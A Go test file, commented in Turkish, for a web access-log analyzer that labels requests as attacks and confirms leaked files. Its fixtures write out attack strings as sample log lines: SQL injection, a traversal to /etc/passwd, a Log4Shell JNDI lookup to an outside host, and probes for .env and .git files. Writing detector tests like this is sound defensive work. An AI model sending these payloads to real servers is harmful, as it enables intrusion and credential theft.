package weblog

import (
	"compress/gzip"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func ln(ip string, t time.Time, req string, status int, bytes int, ua string) string {
	return fmt.Sprintf(`%s - - [%s] "%s" %d %d "-" "%s"`, ip, t.Format("02/Jan/2006:15:04:05 -0700"), req, status, bytes, ua)
}

func TestParseClassify(t *testing.T) {
	now := time.Now()
	cases := map[string][]string{
		ln("1.2.3.4", now, "GET /.env HTTP/1.1", 404, 10, "Mozilla"):                                {"sensitive"},
		ln("1.2.3.4", now, "GET /index.php?id=1%27%20UNION%20SELECT%201,2-- HTTP/1.1", 200, 1, "x"): {"sqli"},
		ln("1.2.3.4", now, "GET /static/..%2f..%2fetc%2fpasswd HTTP/1.1", 400, 1, "x"):              {"traversal"},
		ln("1.2.3.4", now, "POST /xmlrpc.php HTTP/1.1", 404, 1, "x"):                                {"wordpress"},
		ln("1.2.3.4", now, "GET / HTTP/1.1", 200, 1, "sqlmap/1.7"):                                  {"tool"},
		ln("1.2.3.4", now, "GET /?x=${jndi:ldap://e.com/a} HTTP/1.1", 400, 1, "x"):                  {"rce"},
		ln("1.2.3.4", now, "GET /phpmyadmin/ HTTP/1.1", 404, 1, "x"):                                {"admin"},
		ln("1.2.3.4", now, `\x16\x03\x01\x02\x00\x01\x00`, 400, 1, "-"):                             {"invalid"},
		ln("1.2.3.4", now, "GET /araclar/pdf-birlestir HTTP/2.0", 200, 5000, "Mozilla/5.0"):         nil,
	}
	for l, want := range cases {
		e, ok := ParseLine(l)
		if !ok {
			t.Errorf("çözülemedi: %s", l)
			continue
		}
		if got := Classify(e); fmt.Sprint(got) != fmt.Sprint(want) {
			t.Errorf("%s → %v, beklenen %v", e.Path, got, want)
		}
	}
}

func TestReport(t *testing.T) {
	dir := t.TempDir()
	now := time.Now()
	var a, b strings.Builder
	for i := 0; i < 40; i++ {
		fmt.Fprintln(&a, ln("45.148.10.5", now.Add(-time.Duration(i)*time.Minute), fmt.Sprintf("GET /yok-%d HTTP/1.1", i), 404, 10, "curl"))
	}
	fmt.Fprintln(&a, ln("45.148.10.5", now.Add(-2*time.Minute), "GET /.env HTTP/1.1", 200, 120, "curl"))
	fmt.Fprintln(&a, ln("185.224.128.9", now.Add(-3*time.Minute), "GET /.git/config HTTP/1.1", 200, 900, "Mozilla"))
	fmt.Fprintln(&a, ln("127.0.0.1", now.Add(-time.Minute), "GET / HTTP/1.1", 200, 10, "Mozilla"))
	fmt.Fprintln(&a, ln("8.8.8.8", now.Add(-48*time.Hour), "GET /.env HTTP/1.1", 404, 10, "eski"))
	os.WriteFile(filepath.Join(dir, "access.log"), []byte(a.String()), 0o644)
	// döndürülmüş gz dosya
	fmt.Fprintln(&b, ln("193.32.162.79", now.Add(-5*time.Hour), "GET /wp-login.php HTTP/1.1", 404, 10, "WPScan v3"))
	f, _ := os.Create(filepath.Join(dir, "access.log.2.gz"))
	gz := gzip.NewWriter(f)
	gz.Write([]byte(b.String()))
	gz.Close()
	f.Close()

	an := NewAnalyzer()
	an.files = func(time.Time) []logFile {
		return []logFile{{filepath.Join(dir, "access.log"), "app.example.com"}, {filepath.Join(dir, "access.log.2.gz"), ""}}
	}
	an.verify = func(f Finding, hosts []string) Finding {
		f.Confirmed = strings.Contains(f.Path, ".env")
		return f
	}
	var found []string
	an.OnFind = func(f Finding) { found = append(found, f.Path) }
	r := an.Report("24h", true)
	if r.Requests != 44 || r.Attacks != 3 || r.AttackIPs != 3 {
		t.Fatalf("sayılar: istek %d saldırı %d ip %d", r.Requests, r.Attacks, r.AttackIPs)
	}
	if r.TopIPs[0].IP != "45.148.10.5" || r.TopIPs[0].Cats["notfound"] != 40 {
		t.Errorf("ilk IP: %+v", r.TopIPs[0])
	}
	if len(r.Findings) != 2 || !r.Findings[0].Confirmed || fmt.Sprint(found) != "[/.env]" {
		t.Errorf("bulgular: %+v %v", r.Findings, found)
	}
	if r.LocalShare < 2 || r.LocalShare > 3 {
		t.Errorf("yerel oran: %v", r.LocalShare)
	}
	// ikinci rapor bildirimi tekrarlamaz
	an.Report("24h", true)
	if len(found) != 1 {
		t.Errorf("bildirim tekrarlandı: %v", found)
	}
}

func TestVerify(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/.env" {
			w.Write([]byte("DB_PASSWORD=gizli\nAPP_KEY=x\n"))
			return
		}
		w.Write([]byte("<html>ana sayfa</html>")) // SPA: her yola 200
	}))
	defer srv.Close()
	host := strings.TrimPrefix(srv.URL, "http://")
	if f := verifyFinding(Finding{Path: "/.env"}, []string{host}); !f.Confirmed {
		t.Errorf(".env doğrulanmadı: %+v", f)
	}
	if f := verifyFinding(Finding{Path: "/.git/config"}, []string{host}); f.Confirmed {
		t.Errorf("SPA yanıtı sızıntı sayıldı: %+v", f)
	}
}

func TestRealIPConfig(t *testing.T) {
	c := RealIPConfig()
	if !strings.Contains(c, "set_real_ip_from 127.0.0.1;") || !strings.Contains(c, "real_ip_header CF-Connecting-IP;") || !strings.Contains(c, "173.245.48.0/20") {
		t.Fatal(c)
	}
}
